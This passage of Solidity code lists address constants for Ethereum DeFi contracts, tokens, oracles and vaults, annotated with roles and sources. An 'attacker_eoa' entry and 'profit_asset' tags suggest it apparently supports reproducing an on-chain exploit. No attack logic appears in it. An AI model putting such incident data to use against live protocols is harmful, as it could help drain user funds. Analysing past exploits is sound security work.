    address internal constant ChainlinkOracle = 0x48F7E36EB6B826B2dF4B2E630B62Cd25e89E40e2; // Addresses.ChainlinkOracle = 0x48f7e36eb6b826b2df4b2e630b62cd25e89e40e2 label=ChainlinkOracle roles=observed_address source=etherscan_v2 confidence=high
    address internal constant iUSD = 0x48f9e38f3070AD8945DFEae3FA70987722E3D89c; // Addresses.iUSD = 0x48f9e38f3070ad8945dfeae3fa70987722e3d89c label=ReceiptToken token_symbol=iUSD roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant MintController = 0x49877d937B9a00d50557bdC3D87287b5c3a4C256; // Addresses.MintController = 0x49877d937b9a00d50557bdc3d87287b5c3a4c256 label=MintController roles=recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant dUSDC_123 = 0x4a4cf671d7e2838Bc777270D0B3Bf6d93e83D523; // Addresses.dUSDC_123 = 0x4a4cf671d7e2838bc777270d0b3bf6d93e83d523 label=ShareDebtToken token_symbol=dUSDC-123 roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant StakingProxyERC20 = 0x4bFc5292DA18e32ED2354350e07e417cE4796f9C; // Addresses.StakingProxyERC20 = 0x4bfc5292da18e32ed2354350e07e417ce4796f9c label=StakingProxyERC20 roles=recipient source=etherscan_v2 confidence=high
    address internal constant USDe = 0x4c9EDD5852cd905f086C759E8383e09bff1E68B3; // Addresses.USDe = 0x4c9edd5852cd905f086c759e8383e09bff1e68b3 label=USDe token_symbol=USDe roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant MorphoChainlinkOracleV2_990C = 0x4cE176581EB5C84713C2e653b5586a59699F990C; // Addresses.MorphoChainlinkOracleV2_990C = 0x4ce176581eb5c84713c2e653b5586a59699f990c label=MorphoChainlinkOracleV2 roles=observed_address source=etherscan_v2 confidence=high
    address internal constant sUSDS = 0x4e7991e5C547ce825BdEb665EE14a3274f9F61e0; // Addresses.sUSDS = 0x4e7991e5c547ce825bdeb665ee14a3274f9f61e0 label=unresolved token_symbol=sUSDS roles=asset|contract|observed_address|recipient source=unresolved confidence=low
    address internal constant bUSDC_113 = 0x4EF4dc9DEf84E3cc54D7A4Aa95877Fbd4aDD36C1; // Addresses.bUSDC_113 = 0x4ef4dc9def84e3cc54d7a4aa95877fbd4add36c1 label=unresolved token_symbol=bUSDC-113 roles=asset|contract|observed_address|recipient|sender|storage_contract source=unresolved confidence=low
    address internal constant KPK_USDC_Prime = 0x4Ef53d2cAa51C447fdFEEedee8F07FD1962C9ee6; // Addresses.KPK_USDC_Prime = 0x4ef53d2caa51c447fdfeeedee8f07fd1962c9ee6 label=KPK_USDC_Prime token_symbol=KPK_USDC_Prime roles=asset|contract|economic_asset|observed_address|recipient|sender|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium
    address internal constant fxUSDC = 0x4F460bb11cf958606C69A963B4A17f9DaEEea8b6; // Addresses.fxUSDC = 0x4f460bb11cf958606c69a963b4a17f9daeeea8b6 label=MetaMorpho token_symbol=fxUSDC roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant MorphoV2VaultArk = 0x539b7f974cC8E19D7376003877965dFD5E4C97b2; // Addresses.MorphoV2VaultArk = 0x539b7f974cc8e19d7376003877965dfd5e4c97b2 label=MorphoV2VaultArk roles=observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant MorphoChainlinkOracleV2_D554 = 0x5502a4cb797B6Db44275D1BbEA743463d256D554; // Addresses.MorphoChainlinkOracleV2_D554 = 0x5502a4cb797b6db44275d1bbea743463d256d554 label=MorphoChainlinkOracleV2 roles=observed_address source=etherscan_v2 confidence=high
    address internal constant ERC4626Oracle = 0x560742436Dc21e5FCf99723beecc7B7FBAd276f1; // Addresses.ERC4626Oracle = 0x560742436dc21e5fcf99723beecc7b7fbad276f1 label=ERC4626Oracle roles=sender source=etherscan_v2 confidence=high
    address internal constant Proxy_560B3A = 0x560B3A85Af1cEF113BB60105d0Cf21e1d05F91d4; // Addresses.Proxy_560B3A = 0x560b3a85af1cef113bb60105d0cf21e1d05f91d4 label=Proxy roles=recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant ERC4626Ark_A27C = 0x565a4c04E32fBf001AE36C4fB60584A687Ffa27C; // Addresses.ERC4626Ark_A27C = 0x565a4c04e32fbf001ae36c4fb60584a687ffa27c label=ERC4626Ark roles=recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant skyMoneyUsdcRiskCapital = 0x56bfa6f53669B836D1E0Dfa5e99706b12c373ecf; // Addresses.skyMoneyUsdcRiskCapital = 0x56bfa6f53669b836d1e0dfa5e99706b12c373ecf label=VaultV2 token_symbol=skyMoneyUsdcRiskCapital roles=asset|contract|economic_asset|observed_address|profit_asset|recipient|sender|storage_contract|token_related source=etherscan_v2 confidence=high
    address internal constant MorphoChainlinkOracleV2_7D34 = 0x570F093895fEA613e9eD7Ff10DD135E4026A7D34; // Addresses.MorphoChainlinkOracleV2_7D34 = 0x570f093895fea613e9ed7ff10dd135e4026a7d34 label=MorphoChainlinkOracleV2 roles=observed_address source=etherscan_v2 confidence=high
    address internal constant SiloConfig_7847 = 0x59536c9d70a277Bcc1a229121038AB07b0dc7847; // Addresses.SiloConfig_7847 = 0x59536c9d70a277bcc1a229121038ab07b0dc7847 label=SiloConfig roles=sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant MorphoVaultArk_039A = 0x59c6282f9797Eeb3C8622243595303f80131039A; // Addresses.MorphoVaultArk_039A = 0x59c6282f9797eeb3c8622243595303f80131039a label=MorphoVaultArk roles=observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant AVGUSDCCORE = 0x5b56F90340dBAa6a8693DADb141D620f0e154fE6; // Addresses.AVGUSDCCORE = 0x5b56f90340dbaa6a8693dadb141d620f0e154fe6 label=MetaMorphoV1_1 token_symbol=AVGUSDCCORE roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant PendlePrincipalToken = 0x5DbF246B37E1b9ac5D08bb38233d71322AE7D166; // Addresses.PendlePrincipalToken = 0x5dbf246b37e1b9ac5d08bb38233d71322ae7d166 label=PendlePrincipalToken roles=observed_address source=etherscan_v2 confidence=high
    address internal constant SiUSDArk = 0x5Ebbc493fD41dD607cDAd244a9E6CA7466A3F264; // Addresses.SiUSDArk = 0x5ebbc493fd41dd607cdad244a9e6ca7466a3f264 label=SiUSDArk roles=observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant dUSDC_154 = 0x60126ADa7DEBb3EC1875BcA93F6f2cE60dE0d65b; // Addresses.dUSDC_154 = 0x60126ada7debb3ec1875bca93f6f2ce60de0d65b label=ShareDebtToken token_symbol=dUSDC-154 roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant Re7USDC = 0x60d715515d4411f7F43e4206dc5d4a3677f0eC78; // Addresses.Re7USDC = 0x60d715515d4411f7f43e4206dc5d4a3677f0ec78 label=MetaMorpho token_symbol=Re7USDC roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant SPTOKEN_IMPL = 0x6175ddEc3B9b38c88157C10A01ed4A3fa8639cC6; // Addresses.SPTOKEN_IMPL = 0x6175ddec3b9b38c88157c10a01ed4a3fa8639cc6 label=AToken token_symbol=SPTOKEN_IMPL roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant SiloManagedVaultArk = 0x61d7063041d83C8ca3E42c39181dFd14B3Bc76c2; // Addresses.SiloManagedVaultArk = 0x61d7063041d83c8ca3e42c39181dfd14b3bc76c2 label=SiloManagedVaultArk roles=observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant CSUSDC = 0x62fE596d59fB077c2Df736dF212E0AFfb522dC78; // Addresses.CSUSDC = 0x62fe596d59fb077c2df736df212e0affb522dc78 label=MetaMorphoV1_1 token_symbol=CSUSDC roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant fxSP = 0x65C9A641afCEB9C0E6034e558A319488FA0FA3be; // Addresses.fxSP = 0x65c9a641afceb9c0e6034e558a319488fa0fa3be label=TransparentUpgradeableProxy token_symbol=fxSP roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant UniversalRouter = 0x66a9893cC07D91D95644AEDD05D03f95e1dBA8Af; // Addresses.UniversalRouter = 0x66a9893cc07d91d95644aedd05d03f95e1dba8af label=UniversalRouter roles=asset|contract|observed_address|recipient|sender source=etherscan_v2 confidence=high
    address internal constant MorphoVaultArk_A53F = 0x679794389B05B0db3CbEdAcC908ff8Fb531fA53f; // Addresses.MorphoVaultArk_A53F = 0x679794389b05b0db3cbedacc908ff8fb531fa53f label=MorphoVaultArk roles=recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant aHorRwaUSDC = 0x68215B6533c47ff9f7125aC95adf00fE4a62f79e; // Addresses.aHorRwaUSDC = 0x68215b6533c47ff9f7125ac95adf00fe4a62f79e label=InitializableImmutableAdminUpgradeabilityProxy token_symbol=aHorRwaUSDC roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F; // Addresses.DAI = 0x6b175474e89094c44da98b954eedeac495271d0f label=Dai token_symbol=DAI roles=asset|contract|economic_asset|observed_address|profit_asset|recipient|token_related source=etherscan_v2 confidence=high
    address internal constant PYUSD = 0x6c3ea9036406852006290770BEdFcAbA0e23A0e8; // Addresses.PYUSD = 0x6c3ea9036406852006290770bedfcaba0e23a0e8 label=AdminUpgradeabilityProxy token_symbol=PYUSD roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant A_6FBC44_07A5 = 0x6FBc446f25Ab5141C4F7E7711E52DFc0AdA407A5; // Addresses.A_6FBC44_07A5 = 0x6fbc446f25ab5141c4f7e7711e52dfc0ada407a5 label=unresolved roles=recipient|sender|storage_contract source=unresolved confidence=low
    address internal constant A_73E0C0_DB98 = 0x73E0C0d45E048D25Fc26Fa3159b0aA04BfA4Db98; // Addresses.A_73E0C0_DB98 = 0x73e0c0d45e048d25fc26fa3159b0aa04bfa4db98 label=unresolved roles=observed_address source=unresolved confidence=low
    address internal constant mGLOBAL = 0x7433806912Eae67919e66aea853d46Fa0aef98A8; // Addresses.mGLOBAL = 0x7433806912eae67919e66aea853d46fa0aef98a8 label=unresolved token_symbol=mGLOBAL roles=asset|contract|observed_address|recipient|storage_contract source=unresolved confidence=low
    address internal constant SiloConfig_125A = 0x743584d41291e3A8827D3aD04A480221A3Ea125A; // Addresses.SiloConfig_125A = 0x743584d41291e3a8827d3ad04a480221a3ea125a label=SiloConfig roles=sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant SwapFarmV2WithMaturity = 0x75381e9Bc6B908a2e9bC31A535fC48CeCeAc568E; // Addresses.SwapFarmV2WithMaturity = 0x75381e9bc6b908a2e9bc31a535fc48ceceac568e label=SwapFarmV2WithMaturity roles=recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant MorphoVaultArk_D275 = 0x756ca6D02523c908972C4F82a4821c15F740D275; // Addresses.MorphoVaultArk_D275 = 0x756ca6d02523c908972c4f82a4821c15f740d275 label=MorphoVaultArk roles=recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant dPENDLE_LPT_WRAPPED_113 = 0x76A29A00eA62c6846cB382C3CAF35F775c370D2f; // Addresses.dPENDLE_LPT_WRAPPED_113 = 0x76a29a00ea62c6846cb382c3caf35f775c370d2f label=ShareDebtToken token_symbol=dPENDLE-LPT-WRAPPED-113 roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant ERC4626FarmWithMaturity = 0x76D2E84009dAE457f8667D823c7c96e9A7c35B78; // Addresses.ERC4626FarmWithMaturity = 0x76d2e84009dae457f8667d823c7c96e9a7c35b78 label=ERC4626FarmWithMaturity roles=recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant fxSAVE = 0x7743e50F534a7f9F1791DdE7dCD89F7783Eefc39; // Addresses.fxSAVE = 0x7743e50f534a7f9f1791dde7dcd89f7783eefc39 label=TransparentUpgradeableProxy token_symbol=fxSAVE roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant hyperUSDCa = 0x777791C4d6DC2CE140D00D2828a7C93503c67777; // Addresses.hyperUSDCa = 0x777791c4d6dc2ce140d00d2828a7c93503c67777 label=MetaMorphoV1_1 token_symbol=hyperUSDCa roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant ERC4626Ark_8290 = 0x77e5f42d5cf2d1B9849AE6A5d2D7dC5b774f8290; // Addresses.ERC4626Ark_8290 = 0x77e5f42d5cf2d1b9849ae6a5d2d7dc5b774f8290 label=ERC4626Ark roles=recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant FluidFTokenArk = 0x78D0bf191f3D38713270E56d9b879A54C2864CFD; // Addresses.FluidFTokenArk = 0x78d0bf191f3d38713270e56d9b879a54c2864cfd label=FluidFTokenArk roles=observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant MorphoVaultArk_E131 = 0x78f466314b2A69685e464431eDF7688cB77De131; // Addresses.MorphoVaultArk_E131 = 0x78f466314b2a69685e464431edf7688cb77de131 label=MorphoVaultArk roles=recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant eUSDC_2 = 0x797DD80692c3b2dAdabCe8e30C07fDE5307D48a9; // Addresses.eUSDC_2 = 0x797dd80692c3b2dadabce8e30c07fde5307d48a9 label=BeaconProxy token_symbol=eUSDC-2 roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant FleetCommanderRewardsManager = 0x7A49E6c6C64B32b7E89Bd9c0De121165977c422d; // Addresses.FleetCommanderRewardsManager = 0x7a49e6c6c64b32b7e89bd9c0de121165977c422d label=FleetCommanderRewardsManager roles=observed_address source=etherscan_v2 confidence=high
    address internal constant Accounting = 0x7A5C5dbA4fbD0e1e1A2eCDBe752fAe55f6E842B3; // Addresses.Accounting = 0x7a5c5dba4fbd0e1e1a2ecdbe752fae55f6e842b3 label=Accounting roles=sender source=etherscan_v2 confidence=high
    address internal constant Proxy_7AD5FF = 0x7aD5fFa5fdF509E30186F4609c2f6269f4B6158F; // Addresses.Proxy_7AD5FF = 0x7ad5ffa5fdf509e30186f4609c2f6269f4b6158f label=Proxy roles=sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant FluidFTokenArk_94F3 = 0x7B1e86949C7B74761046d79Fb457985FB3a494F3; // Addresses.FluidFTokenArk_94F3 = 0x7b1e86949c7b74761046d79fb457985fb3a494f3 label=FluidFTokenArk roles=recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant attacker_eoa = 0x7BF716167B48CF527725722C6d79494b45B3BDCa; // Addresses.attacker_eoa = 0x7bf716167b48cf527725722c6d79494b45b3bdca label=attacker_eoa roles=attacker_eoa|contract|economic_holder|observed_address|profit_holder|recipient|sender source=tx_metadata.from confidence=high
    address internal constant aEthUSDG = 0x7c0477d085ECb607CF8429f3eC91Ae5E1e460F4F; // Addresses.aEthUSDG = 0x7c0477d085ecb607cf8429f3ec91ae5e1e460f4f label=InitializableImmutableAdminUpgradeabilityProxy token_symbol=aEthUSDG roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant bUSDC_117 = 0x7d9d91B85b0De3ab74007803a601Da8c1D277A3a; // Addresses.bUSDC_117 = 0x7d9d91b85b0de3ab74007803a601da8c1d277a3a label=Silo token_symbol=bUSDC-117 roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant WstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0; // Addresses.WstETH = 0x7f39c581f595b53c5cb19bd0b3f8da6c935e2ca0 label=WstETH roles=observed_address source=etherscan_v2 confidence=high
    address internal constant bUSDC_150 = 0x7F8fb6Db209066e3200fAe6F7597d5585e12A42f; // Addresses.bUSDC_150 = 0x7f8fb6db209066e3200fae6f7597d5585e12a42f label=Silo token_symbol=bUSDC-150 roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant syrupUSDC = 0x80ac24aA929eaF5013f6436cdA2a7ba190f5Cc0b; // Addresses.syrupUSDC = 0x80ac24aa929eaf5013f6436cda2a7ba190f5cc0b label=MaplePool token_symbol=syrupUSDC roles=asset|contract|observed_address|recipient|sender source=etherscan_v2 confidence=high
    address internal constant AaveV3Farm = 0x817d93DbdFd8190bbef0a73fCf5Dd9DA5A87E032; // Addresses.AaveV3Farm = 0x817d93dbdfd8190bbef0a73fcf5dd9da5a87e032 label=AaveV3Farm roles=recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant MorphoV2VaultArk_0B25 = 0x81f025C87367033d87B6d3A95289B36106770B25; // Addresses.MorphoV2VaultArk_0B25 = 0x81f025c87367033d87b6d3a95289b36106770b25 label=MorphoV2VaultArk roles=asset|contract|economic_holder|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant ERC4626Ark_9A28 = 0x827d166823d9372Bb8573FcBB0eE776d82289A28; // Addresses.ERC4626Ark_9A28 = 0x827d166823d9372bb8573fcbb0ee776d82289a28 label=ERC4626Ark roles=observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant RLUSD = 0x8292Bb45bf1Ee4d140127049757C2E0fF06317eD; // Addresses.RLUSD = 0x8292bb45bf1ee4d140127049757c2e0ff06317ed label=StablecoinProxy token_symbol=RLUSD roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant SiloConfig_C352 = 0x8332F03C0EcFB5b6BcF50484A2e9C048b79aC352; // Addresses.SiloConfig_C352 = 0x8332f03c0ecfb5b6bcf50484a2e9c048b79ac352 label=SiloConfig roles=sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant vgUSDC = 0x8399C8Fc273bD165C346Af74A02e65f10e4FD78F; // Addresses.vgUSDC = 0x8399c8fc273bd165c346af74a02e65f10e4fd78f label=SiloVault token_symbol=vgUSDC roles=asset|contract|observed_address|recipient|sender|storage_contract|token_related source=etherscan_v2 confidence=high
    address internal constant cUSDCv3 = 0x83D491269720CE925f92C6bF9F66B7a0779A293a; // Addresses.cUSDCv3 = 0x83d491269720ce925f92c6bf9f66b7a0779a293a label=CometWithExtendedAssetList token_symbol=cUSDCv3 roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant MorphoVaultArk_08FA = 0x842a5a1d456f399EA2fc37BDb77853c4Df1708fa; // Addresses.MorphoVaultArk_08FA = 0x842a5a1d456f399ea2fc37bdb77853c4df1708fa label=MorphoVaultArk roles=observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant SwapFarmV2WithMaturity_E4EE = 0x84FF7Ef9568807c93436F09E2E613dE2aF3FE4EE; // Addresses.SwapFarmV2WithMaturity_E4EE = 0x84ff7ef9568807c93436f09e2e613de2af3fe4ee label=SwapFarmV2WithMaturity roles=recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant OETHProxy = 0x856c4Efb76C1D1AE02e20CEB03A2A6a08b0b8dC3; // Addresses.OETHProxy = 0x856c4efb76c1d1ae02e20ceb03a2a6a08b0b8dc3 label=OETHProxy roles=observed_address source=etherscan_v2 confidence=high
    address internal constant MorphoV2VaultArk_C7B5 = 0x857a0CaC1Ac29d8101822f8879E4e6918293c7b5; // Addresses.MorphoV2VaultArk_C7B5 = 0x857a0cac1ac29d8101822f8879e4e6918293c7b5 label=MorphoV2VaultArk roles=asset|contract|economic_holder|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant Proxy_859C99 = 0x859C9980931fa0A63765fD8EF2e29918Af5b038C; // Addresses.Proxy_859C99 = 0x859c9980931fa0a63765fd8ef2e29918af5b038c label=Proxy roles=recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant SafeProxy = 0x86c18447b3560cd8F3F102EaDEeD288eE61ab8cb; // Addresses.SafeProxy = 0x86c18447b3560cd8f3f102eadeed288ee61ab8cb label=SafeProxy roles=observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant AdaptiveCurveIrm = 0x870aC11D48B15DB9a138Cf899d20F13F79Ba00BC; // Addresses.AdaptiveCurveIrm = 0x870ac11d48b15db9a138cf899d20f13f79ba00bc label=AdaptiveCurveIrm roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant Proxy_87AA77 = 0x87Aa770f610679DFC2553FB95fAc1B4d996BA1cd; // Addresses.Proxy_87AA77 = 0x87aa770f610679dfc2553fb95fac1b4d996ba1cd label=Proxy roles=recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant stcUSD = 0x88887bE419578051FF9F4eb6C858A951921D8888; // Addresses.stcUSD = 0x88887be419578051ff9f4eb6c858a951921d8888 label=unresolved token_symbol=stcUSD roles=asset|contract|observed_address|recipient|storage_contract source=unresolved confidence=low
    address internal constant A_8929CB_C2B8 = 0x8929cb46Cea5F9bC71c95D6b57D2410C016bC2b8; // Addresses.A_8929CB_C2B8 = 0x8929cb46cea5f9bc71c95d6b57d2410c016bc2b8 label=unresolved roles=observed_address|recipient|storage_contract source=unresolved confidence=low
    address internal constant A_8948A5_062F = 0x8948a5F3D24F7A6d50FF36064e8cff33B2aF062f; // Addresses.A_8948A5_062F = 0x8948a5f3d24f7a6d50ff36064e8cff33b2af062f label=0x8948a5f3d24f7a6d50ff36064e8cff33b2af062f roles=asset|contract|economic_holder|observed_address|recipient|sender|storage_contract source=asset_delta.profit_candidates confidence=medium
    address internal constant gtusdcp = 0x8c106EEDAd96553e64287A5A6839c3Cc78afA3D0; // Addresses.gtusdcp = 0x8c106eedad96553e64287a5a6839c3cc78afa3d0 label=VaultV2 token_symbol=gtusdcp roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant PYUSD_256A = 0x8C35CaA5FD5bDC64b6B11344aD57594A3676256a; // Addresses.PYUSD_256A = 0x8c35caa5fd5bdc64b6b11344ad57594a3676256a label=PYUSD token_symbol=PYUSD roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant GnosisSafeProxy = 0x8e03609ed680B237C7b6f8020472CA0687308b24; // Addresses.GnosisSafeProxy = 0x8e03609ed680b237c7b6f8020472ca0687308b24 label=GnosisSafeProxy roles=observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant gtUSDCcore = 0x8eB67A509616cd6A7c1B3c8C21D48FF57df3d458; // Addresses.gtUSDCcore = 0x8eb67a509616cd6a7c1b3c8c21d48ff57df3d458 label=MetaMorpho token_symbol=gtUSDCcore roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant MorphoV2VaultArk_62C7 = 0x8Ec71E0D225B4213A95E669A7286E6D5637462c7; // Addresses.MorphoV2VaultArk_62C7 = 0x8ec71e0d225b4213a95e669a7286e6d5637462c7 label=MorphoV2VaultArk roles=observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant EVault = 0x8Ff1C814719096b61aBf00Bb46EAd0c9A529Dd7D; // Addresses.EVault = 0x8ff1c814719096b61abf00bb46ead0c9a529dd7d label=EVault roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant TransparentUpgradeableProxy_908B39 = 0x908B3921aaE4fC17191D382BB61020f2Ee6C0e20; // Addresses.TransparentUpgradeableProxy_908B39 = 0x908b3921aae4fc17191d382bb61020f2ee6c0e20 label=TransparentUpgradeableProxy roles=sender source=etherscan_v2 confidence=high
    address internal constant A_93D639_DE89 = 0x93d6393E66b56449B7926B9AbfEb37606732DE89; // Addresses.A_93D639_DE89 = 0x93d6393e66b56449b7926b9abfeb37606732de89
    address internal constant MorphoMarketV1AdapterV2_E001 = 0x9414a42Eab4580C042b18deF4d37372A7881e001; // Addresses.MorphoMarketV1AdapterV2_E001 = 0x9414a42eab4580c042b18def4d37372a7881e001 label=MorphoMarketV1AdapterV2 roles=asset|contract|observed_address|recipient|sender source=etherscan_v2 confidence=high
    address internal constant dUSDC_127 = 0x9615169de459C8f5c57Ddd13C2CdC1445Ed20bC4; // Addresses.dUSDC_127 = 0x9615169de459c8f5c57ddd13c2cdc1445ed20bc4 label=ShareDebtToken token_symbol=dUSDC-127 roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant StablecoinUpgradeableV2 = 0x9747a0d261c2d56Eb93f542068e5d1E23170fa9e; // Addresses.StablecoinUpgradeableV2 = 0x9747a0d261c2d56eb93f542068e5d1e23170fa9e label=StablecoinUpgradeableV2 roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant DaiJoin = 0x9759A6Ac90977b93B58547b4A71c78317f391A28; // Addresses.DaiJoin = 0x9759a6ac90977b93b58547b4a71c78317f391a28 label=DaiJoin roles=asset|contract|observed_address source=etherscan_v2 confidence=high
    address internal constant eUSDC_37 = 0x98281466aBcF48eAAD8c6E22dEdD18A3426A93b4; // Addresses.eUSDC_37 = 0x98281466abcf48eaad8c6e22dedd18a3426a93b4 label=BeaconProxy token_symbol=eUSDC-37 roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant SkyUsdsArk = 0x9890C99f504337C3500AC05c267c38dfcd41C3e2; // Addresses.SkyUsdsArk = 0x9890c99f504337c3500ac05c267c38dfcd41c3e2 label=SkyUsdsArk roles=asset|contract|economic_holder|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant apxUSD = 0x98A878b1Cd98131B271883B390f68D2c90674665; // Addresses.apxUSD = 0x98a878b1cd98131b271883b390f68d2c90674665 label=ERC1967Proxy token_symbol=apxUSD roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant aEthUSDC = 0x98C23E9d8f34FEFb1B7BD6a91B7FF122F4e16F5c; // Addresses.aEthUSDC = 0x98c23e9d8f34fefb1b7bd6a91b7ff122f4e16f5c label=InitializableImmutableAdminUpgradeabilityProxy token_symbol=aEthUSDC roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant LVUSDC = 0x98C49e13bf99D7CAd8069faa2A370933EC9EcF17; // Addresses.LVUSDC = 0x98c49e13bf99d7cad8069faa2a370933ec9ecf17 label=FleetCommander token_symbol=LVUSDC roles=asset|contract|economic_asset|observed_address|profit_asset|recipient|sender|storage_contract|token_related source=etherscan_v2 confidence=high
    address internal constant ERC1967Proxy = 0x99CD4Ec3f88A45940936F469E4bB72A2A701EEB9; // Addresses.ERC1967Proxy = 0x99cd4ec3f88a45940936f469e4bb72a2a701eeb9 label=ERC1967Proxy roles=observed_address source=etherscan_v2 confidence=high
    address internal constant MorphoVaultArk_2C7E = 0x99d21C9c1D68CE0e9bbF77AE0c965Daa3Ab02c7e; // Addresses.MorphoVaultArk_2C7E = 0x99d21c9c1d68ce0e9bbf77ae0c965daa3ab02c7e label=MorphoVaultArk roles=recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant ERC4626Ark_80EB = 0x9Ad7ea2B4Eeb732339b19c5EabF087c6164e80eB; // Addresses.ERC4626Ark_80EB = 0x9ad7ea2b4eeb732339b19c5eabf087c6164e80eb label=ERC4626Ark roles=observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant eUSDC_70 = 0x9bD52F2805c6aF014132874124686e7b248c2Cbb; // Addresses.eUSDC_70 = 0x9bd52f2805c6af014132874124686e7b248c2cbb label=BeaconProxy token_symbol=eUSDC-70 roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant Proxy_9CEF7D = 0x9ceF7d1D390A4811bBa1BC40A53B40a506C33B19; // Addresses.Proxy_9CEF7D = 0x9cef7d1d390a4811bba1bc40a53b40a506c33b19 label=Proxy roles=sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant FxUSDBasePool = 0x9CFeFD90d4C8428D4CBaC9bAAA6D52C6BA7897f9; // Addresses.FxUSDBasePool = 0x9cfefd90d4c8428d4cbac9baaa6d52c6ba7897f9 label=FxUSDBasePool roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant sUSDe = 0x9D39A5DE30e57443BfF2A8307A4256c8797A3497; // Addresses.sUSDe = 0x9d39a5de30e57443bff2a8307a4256c8797a3497 label=StakedUSDeV2 token_symbol=sUSDe roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant dRLP_154 = 0x9E0ADD7801c13A4c4eC8fb029721A1B88b5B0935; // Addresses.dRLP_154 = 0x9e0add7801c13a4c4ec8fb029721a1b88b5b0935 label=ShareDebtToken token_symbol=dRLP-154 roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant ATOKEN_IMPL = 0x9EB507147b99D3Cde32A53Bd5cd12bDEEaC26E5c; // Addresses.ATOKEN_IMPL = 0x9eb507147b99d3cde32a53bd5cd12bdeeac26e5c label=ATokenInstance token_symbol=ATOKEN_IMPL roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant ERC4626Oracle_8E44 = 0x9EC13aE4E3028Ea2dC7BD282aF421DC9AF308E44; // Addresses.ERC4626Oracle_8E44 = 0x9ec13ae4e3028ea2dc7bd282af421dc9af308e44 label=ERC4626Oracle roles=sender source=etherscan_v2 confidence=high
